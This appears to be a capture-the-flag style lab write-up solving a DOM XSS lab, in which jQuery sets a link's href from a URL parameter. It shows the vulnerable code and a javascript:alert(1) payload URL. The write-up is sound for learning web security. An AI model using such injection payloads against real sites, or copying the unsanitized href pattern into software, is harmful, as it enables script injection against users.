# DOM XSS in jQuery anchor href attribute sink using location.search source — Apprentice

**Status:** Solved

---

## Goal

Exploit XSS in jQuery code that sets href attribute using URL parameter.

---

## Steps (simple & complete)

1. **Find the feature**
   - Go to homepage
   - Look for "Back" or "Submit feedback" link
   - Its dynamically generated by jQuery

2. **Check the jQuery code**
   - View source, find something like:
```javascript
   var returnPath = new URLSearchParams(window.location.search).get('returnPath');
   $("a").attr("href", returnPath);
```

3. **Inject JavaScript URL**
   - Use `javascript:` protocol:
```
   ?returnPath=javascript:alert(1)
```

4. **Execute attack**
```
   https://TARGET/feedback?returnPath=javascript:alert(1)
```

5. **Click the link**
   - Click "Back" link
   - Alert fires! Lab solved

---

## Example

**Normal:**
```
?returnPath=/
Link: <a href="/">Back</a>
```

**XSS:**
```
?returnPath=javascript:alert(1)
Link: <a href="javascript:alert(1)">Back</a>
Click link → Alert! ✓
```

---

